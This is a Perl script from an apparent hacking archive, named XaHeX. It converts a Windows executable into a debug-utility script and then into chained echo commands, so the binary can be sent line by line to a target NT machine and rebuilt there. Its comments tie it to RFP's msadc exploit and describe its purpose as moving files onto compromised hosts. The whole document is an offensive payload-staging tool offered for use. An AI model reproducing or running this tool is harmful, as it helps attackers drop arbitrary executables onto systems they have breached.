#!/usr/bin/perl
#
# farm9, Inc.{www.farm9.com}
#
# Egatobas Advanced Research Labs brings you XaHeX
# part of the point and click hacking archive.
#
# This script takes an exe/com file and converts it to
# an ascii debug file that can be piped back through
# debug to once agian become an exe.
#
# This scripts was designed to automatically call
# RFP's msadc exploit but i never finished it.
# So the final file it creates it an echo script
# that can be transfered over one line at a time
# This script creates the debug.file that can be
# run through debug <standard dos util on every NT
# box i've ever run into> to get the .exe / .com
# back.
#
# Thanks to all the people from 40Hex,
#
# Props: natasha, {Travis}, martyR
#
# Requirements to run. need HexDump.pm from cpan
#
# This code is like GPL and stuff.
#
# XaHeX by Xram_LraK
#
#
$FileToConvert = $ARGV[0];
$Target	       = $ARGV[1];

if($#ARGV != 1) {
  print "Usage: xahex.pl <filetosend> <target>\n";
  exit;
}

use Data::HexDump;
$file2dump = $FileToConvert;
$CrapLineNum = 2;

open(INFILE, $file2dump);
 @FileStat = stat(INFILE);
 $FileSize = $FileStat[7];
 $FileSize = sprintf("%.4x", $FileSize);

open(TMP, ">./tmp.file");

$i = 0;

my $f = new Data::HexDump;
   $f->file($file2dump);
   $f->block_size(1024);
	
while(<INFILE>) {
   print TMP $f->dump;
}
close(TMP);

open(DEBUG, ">./debug.file");
open(TMP, "./tmp.file");

while(<TMP>) {
   $TheLine = $_;
   chomp($TheLine);
      if($i > 1) {	
         ($Col1, $Col2) = split("-", $TheLine);
	 ($offset, $Hex1) = split("  ", $Col1);
	 $offset =~ s/0000//;
	 ($Hex2, $Ascii) = split("  ", $Col2);
	 $Hex2 =~ s/^\ //;
	 $offset = hex($offset);
	 $offset = $offset + 256;
	 $offset = sprintf("%.4x", $offset);
	 print DEBUG "e $offset $Hex1$Hex2\n";	
      }
   $i += 1;
}
close(TMP);
unlink("./tmp.file");

print DEBUG "n xram.bin\n";
print DEBUG "r cx\n";
print DEBUG "$FileSize\n";
print DEBUG "w 0100\n";
print DEBUG "q\n";
close(DEBUG);

#creating long line file

open(FH, "./debug.file");
$i = 0;

while(<FH>) {
   $TheLine = $_;
   $Array[$i] = $TheLine;
$i += 1;
}
close(FH);
open(FH, ">final.file");

for($j = 0; $j < $i; $j += 1){
   chomp($Array[$j]);
}
$h = 0;

for($k = 0; $k < $i; $k += 1){
   $h += 1;
   if($h eq 1) {
      print FH "echo $Array[$k]>>a";
   }else{
      print FH "&&echo $Array[$k]>>a";
   }
   if($h eq 31) {
      print FH "\n";
      $h = 0;
   }
}

unlink("./debug.file");
